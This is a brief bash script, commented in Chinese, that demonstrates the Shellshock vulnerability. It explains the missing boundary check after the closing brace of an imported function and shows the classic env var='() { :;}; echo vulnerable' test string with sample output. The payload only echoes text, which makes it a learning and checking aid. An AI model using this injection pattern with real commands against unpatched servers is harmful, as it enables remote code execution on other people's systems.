#!/bin/bash1

# 这里其实是在设置环境变量的时候执行echo
# 注意观察其输出 

# 漏洞的起因就在于设置函数环境变量时，未对函数结尾”}”做边界检查，
# 导致“}”后如果存在代码也能被成功执行了。

env var='() { :;}; echo vulnerable' bash1 -c "echo "----"; env; echo this is a test; echo "-----""
#env var='() { true;}; echo vulnerable' bash1 -c "echo "----"; env; echo this is a test; echo "-----""


# bash 会识别出是不是函数 发现不是一个函数的时候会报错  bash1: error importing function definition for `var'
# 如果用; 号隔开， 设置好这个函数环境变量之后 仍然把后面的命令执行了

#bash1: var: line 1: syntax error: unexpected end of file
#bash1: error importing function definition for `var'
#
#env var='() { :;}echo vulnerable' bash1 -c "echo "----"; env; echo this is a test; echo "-----""

# root@debian32-1:~/programming/web/shellshock# ./vulnerable.sh
# # vulnerable   #  ----- 在用env 设置环境变量的时候 就会输出  
# ----
# TERM=screen   # 开始显示 env命令的输出
# SHELL=/bin/bash
# ......
# DISPLAY=localhost:10.0
# var=() {  :
# }
# _=/usr/bin/env
# this is a test   # env 命令输出完毕 开始输出 echo 
# -----

